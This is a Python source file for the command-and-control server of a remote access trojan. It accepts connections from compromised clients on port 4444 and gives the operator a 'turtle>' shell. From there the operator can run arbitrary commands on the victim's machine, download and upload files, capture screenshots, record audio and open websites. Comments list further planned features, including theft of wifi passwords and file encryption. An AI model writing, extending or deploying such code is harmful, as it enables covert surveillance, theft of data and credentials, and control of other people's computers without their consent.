import socket
import threading
import time
import os
from queue import Queue
import tqdm

import subprocess
import base64



NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []
addr_hosts = []

# COMMANDS = {'Commands':['Desscription'],
#             'help':['Shows this help'],
#             'list':['Lists connected clients'],
#             'select':['Selects a client by its index. Takes index as a parameter'],
#             'quit':['Stops current connection with a client. To be used when client is selected'],
#             'record <filename_in_which_we_want_save> <time(sec)>':['Records sound of client till amount of time which you specified'],
#             'screenshot <filename_in_which_we_want_save>':['Takes a screenshot of client\'s screens'],
#             'upload <file_which_you_want_to_upload> <filename_at_client_side>':['To upload a file to client.'],
#             'download <file_which_you_want_to_download> <filename_at_server_side>':['To download a file from client.'],
#             'shutdown':['Shuts server down'],
#            }

COMMANDS = {"Commands":         ["Desscription"],
            'help':             ['Show this help message'],
            "download":         ["Download file from client machine"],
                # :upload       Upload file to client machine
                # :kill         Kill the connection with client machine
                # :exec         Run external command
                # :screenshot   Take a screenshot of the client machine
                # :recording    Take a voice recording of the client
                # :check        Check if client machine is connected to internet
                # :wifi         Show Client machine wifi info [names,passwod,etc]
                # :browse       Open an website on client machine browser
                # :encrypt      Encrypt a file on a client machine
                # :decrypt      Decrypt a file on a client machine
                # pwd           Print working directory in client machine
                # cd -          Switch back to previous directory in client machine
                # cd --         Switch back to first directory when connection was established with client machine
           }

def print_name():
    name = '''
  _____     ______   _____  
 |  __ \   |  ____| |  __ \ 
 | |__) |  | |__    | |__) |
 |  _  /   |  __|   |  ___/ 
 | | \ \   | |____  | |     
 |_|  \_\  |______| |_|     
                            
'''
    print(name)

# def print_name():
#     name = '''
# \033[91m      
# \033[92m              # #   #    # #    #  ####  #####  #  ####  #    # 
# \033[93m             #   #  ##   # ##   # #    # #    # # #    # ##   # 
# \033[94m            #     # # #  # # #  # #    # #    # # #    # # #  # 
# \033[94m            ####### #  # # #  # # #    # #####  # #    # #  # # 
# \033[95m            #     # #   ## #   ## #    # #   #  # #    # #   ## 
# \033[96m            #     # #    # #    #  ####  #    # #  ####  #    #                             
# '''
#     print(name)



def socket_create():
    try:
        global host
        global port
        global s
        host = '127.0.0.1'
        port = 4444
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def socket_bind():
    try:
        global host
        global port
        global s
        print('Binding socket to port: ' + str(port))
        print_name()
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print('Socket binding error: ' + str(msg))
        time.sleep(5)
        socket_bind()


def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    del addr_hosts[:]
    while True:
        try:
            conn, address = s.accept()
            
            conn.setblocking(1)
            client_hostname = conn.recv(1024).decode('utf-8')
            all_connections.append(conn)
            all_addresses.append(address)
            addr_hosts.append(client_hostname,)
            print('\nConnection has been established: ' + address[0])

        except:
            print('Error accepting connections')


# def print_help():
#     for cmd, v in COMMANDS.items():
#         print("{0}:{1}".format(cmd, v[0]))
#     return

def print_help():
    # ANSI escape sequence for green color
    green_color = '\033[92m'
    # ANSI escape sequence to reset text color to default
    reset_color = '\033[0m'
    
    for cmd, v in COMMANDS.items():
        print("{0}:{1}{2}{3}".format(cmd, green_color, v[0], reset_color))
    return



def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif 'help' in cmd:
            print_help()
        else:
            print('Command not recognized')


def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            del addr_hosts[i]
            continue
        results += str(i) + '    ' + str(all_addresses[i][0]) + '     ' + str(all_addresses[i][1]) + '    '+ str(addr_hosts[i]) + '\n'
    print('------Clients-------' + '\n' + results)


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print('You are now connected to ' + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end='')
        return conn
    except:
        print('Not a valid selection')
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                if cmd.startswith("download"):
                    conn.send(str.encode(cmd))
                    download_file(conn, cmd.split()[1])
                elif cmd.startswith("upload"):
                    conn.send(str.encode(cmd))
                    upload_file(conn, cmd.split()[1])
                elif cmd.startswith("browse"):
                    conn.send(str.encode(cmd))
                    browse(conn, cmd.split()[1])
                elif cmd.startswith("screenshot"):
                    conn.send(str.encode(cmd))
                    screenshot(conn, cmd.split()[1])
                elif cmd.startswith("record"):
                    conn.send(str.encode(cmd))
                    recording(conn, cmd.split()[1])


                else:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), 'utf-8')
                    print(client_response, end='')
            if cmd == 'quit':
                break
        except:
            print('Connection was lost')
            break


def download_file(conn, filename):
    try:
        conn.send(str.encode(filename))
        response = conn.recv(1024).decode()
        if response == 'FileNotFound':
            print('File not found on the remote server')
        else:
            with open(filename, 'wb') as file:
                while True:
                    data = conn.recv(1024)
                    if data == b'Done':
                        print('File downloaded successfully')
                        break
                    file.write(data)
    except Exception as e:
        print('Error occurred while downloading the file:', str(e))


def upload_file(conn, filename):
    try:
        if os.path.exists(filename):
            conn.send(b'Exists')
            response = conn.recv(1024).decode()
            if response == 'FileExists':
                print('File already exists on the remote server')
            else:
                with open(filename, 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if not data:
                            break
                        conn.sendall(data)
                time.sleep(0.5)
                conn.send(b'Done')
                print('File uploaded successfully')
        else:
            conn.send(b'NotFound')
            print('File not found on the local machine')
    except Exception as e:
        print('Error occurred while uploading the file:', str(e))

    except Exception as e:
        print('Error occurred while downloading the file:', str(e))


def screenshot(conn, filename):
    try:
        conn.send(str.encode(filename))
        response = conn.recv(1024).decode()
        if response == 'FileNotFound':
            print('File not found on the remote server')
        else:
            with open(filename, 'wb') as file:
                while True:
                    data = conn.recv(1024)
                    if data == b'Done':
                        print('Screenshot Done Successfully')
                        break
                    file.write(data)
    except Exception as e:
        print('Error occurred while downloading the file:', str(e))


def recording(conn, filename):
    try:
        print("Recording.....")
        conn.send(str.encode(filename))
        response = conn.recv(1024).decode()
        if response == 'FileNotFound':
            print('File not found on the remote server')
        else:
            with open(filename, 'wb') as file:
                while True:
                    data = conn.recv(1024)
                    if data == b'Done':
                        print('Recording Done Successfully')
                        break
                    file.write(data)
    except Exception as e:
        print('Error occurred while downloading the file:', str(e))







def browse(conn,cmd):
  url = "".join(cmd.split("browse")).strip()
  if not url.strip(): print("Usage: browse <Websute_URL>\n")
  else:
    if not url.startswith(("http://","https://")): url = "http://"+url
    print("[~] Opening [ {} ]...".format(url))
    conn.send("browse {}".format(url).encode("UTF-8"))
    print("[*] Done \n")

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
